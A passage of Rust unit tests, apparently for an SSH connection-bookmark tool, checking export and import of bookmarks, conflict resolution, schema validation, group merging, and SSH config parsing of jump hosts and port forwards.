        let file = ExportFile {
            schema_version: 1,
            exported_at: Utc::now(),
            app: "peler".into(),
            groups: src.groups.clone(),
            bookmarks: vec![src.bookmarks[0].clone(), pg_endpoint_twin.clone()],
            credentials: None,
        };
        let json = serde_json::to_vec(&file).unwrap();
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &local);
        assert_eq!(plan.conflicts(), 2);
        assert!(matches!(
            plan.items[0].status,
            ItemStatus::Conflict {
                matched_by: MatchedBy::Id,
                ..
            }
        ));
        assert!(matches!(
            plan.items[1].status,
            ItemStatus::Conflict {
                matched_by: MatchedBy::Endpoint,
                ..
            }
        ));
        assert_eq!(plan.summary(), (0, 0, 2), "conflicts default to skip");

        plan.items[0].resolution = Resolution::Overwrite;
        plan.items[1].resolution = Resolution::KeepBoth;
        assert_eq!(plan.summary(), (1, 1, 0));
        let n = local.bookmarks.len();
        let out = plan.apply(&mut local);
        assert_eq!((out.added, out.updated), (1, 1));
        assert_eq!(local.bookmarks.len(), n + 1);
        assert_eq!(local.bookmarks[0].notes, "front");
        assert!(local.bookmark(pg_endpoint_twin.id).is_some());
    }

    #[test]
    fn rejects_newer_schema_and_garbage() {
        let err =
            read_import(br#"{"schema_version": 7, "groups": [], "bookmarks": []}"#).unwrap_err();
        assert!(err.to_string().contains("newer"), "{err}");
        let err = read_import(br#"{"schema_version": 1, "bookmarks": [{"name": 3}]}"#).unwrap_err();
        assert!(err.to_string().contains("damaged"), "{err}");
        assert!(read_import(b"\x00\xff").is_err());
        assert!(read_import(b"{\"hello\": 1}").is_err());
    }

    #[test]
    fn groups_merge_by_name() {
        let mut local = BookmarkStore::default();
        let prod = local.add_group("Production", None);
        let src = sample_store();
        let json = serde_json::to_vec(
            &export(&src, &ExportScope::All, None, |_| Ok(SecretSet::default())).unwrap(),
        )
        .unwrap();
        let plan = ImportPlan::new(read_import(&json).unwrap(), &local);
        plan.apply(&mut local);
        assert_eq!(
            local
                .child_groups(None)
                .filter(|g| g.name == "Production")
                .count(),
            1
        );
        assert_eq!(local.bookmarks[0].group, Some(prod));
        assert_eq!(local.child_groups(Some(prod)).count(), 2);
    }

    #[test]
    fn ssh_config_import_is_idempotent() {
        let hosts =
            ssh_config::parse_str("Host a\n HostName 1.1.1.1\n User u\n IdentityFile ~/.ssh/k\n");
        let mut store = BookmarkStore::default();
        ImportPlan::new(from_ssh_config(&hosts), &store).apply(&mut store);
        assert_eq!(store.bookmarks.len(), 1);
        assert_eq!(
            store.bookmarks[0].auth,
            Auth::Key {
                path: "~/.ssh/k".into()
            }
        );
        let plan = ImportPlan::new(from_ssh_config(&hosts), &store);
        assert_eq!(plan.summary(), (0, 0, 1));
    }

    #[test]
    fn ssh_config_jump_hosts_link_imported_connections() {
        let hosts = ssh_config::parse_str(
            "Host bastion\n HostName b.example\n IdentityAgent SSH_AUTH_SOCK\n\
             Host app\n HostName 10.0.0.2\n ProxyJump bastion\n LocalForward 8080 localhost:80\n\
             Host far\n HostName 10.0.0.3\n ProxyJump nowhere.example\n",
        );
        let incoming = from_ssh_config(&hosts);
        assert_eq!(incoming.warnings.len(), 1, "{:?}", incoming.warnings);
        let mut store = BookmarkStore::default();
        ImportPlan::new(incoming, &store).apply(&mut store);
        let by_name = |n: &str| store.bookmarks.iter().find(|b| b.name == n).unwrap();
        let (bastion, app, far) = (by_name("bastion"), by_name("app"), by_name("far"));
        assert_eq!(
            bastion.auth,
            Auth::Agent {
                socket: String::new()
            }
        );
        assert_eq!(app.jump, Some(bastion.id));
        assert_eq!(app.forwards.len(), 1);
        assert_eq!(far.jump, None);
        let chain: Vec<&str> = store
            .jump_chain(app)
            .unwrap()
            .iter()
            .map(|b| b.name.as_str())
            .collect();
        assert_eq!(chain, ["bastion"]);
    }

    /// Jump hosts and port forwards survive an export and import.
    #[test]
    fn export_keeps_jump_hosts_and_forwards() {
        let mut store = BookmarkStore::default();
        let bastion = Bookmark {
            name: "bastion".into(),
            host: "b.example".into(),
            ..Default::default()
        };
        let app = Bookmark {
            name: "app".into(),
            host: "10.0.0.2".into(),
            jump: Some(bastion.id),
            forwards: vec![super::super::Forward {
                kind: super::super::ForwardKind::Dynamic,
                listen_port: 1080,
                host: String::new(),
                port: 0,
            }],
            ..Default::default()
        };
        store.bookmarks = vec![bastion, app];
        let file = export(
            &store,
            &ExportScope::All,
            None,
            |_| Ok(SecretSet::default()),
        )
        .unwrap();
        let json = serde_json::to_vec(&file).unwrap();
        let mut other = BookmarkStore::default();
        ImportPlan::new(read_import(&json).unwrap(), &other).apply(&mut other);
        let bastion = other
            .bookmarks
            .iter()
            .find(|b| b.name == "bastion")
            .unwrap();
        let app = other.bookmarks.iter().find(|b| b.name == "app").unwrap();
        assert_eq!(app.jump, Some(bastion.id));
        assert_eq!(app.forwards.len(), 1);
    }
}
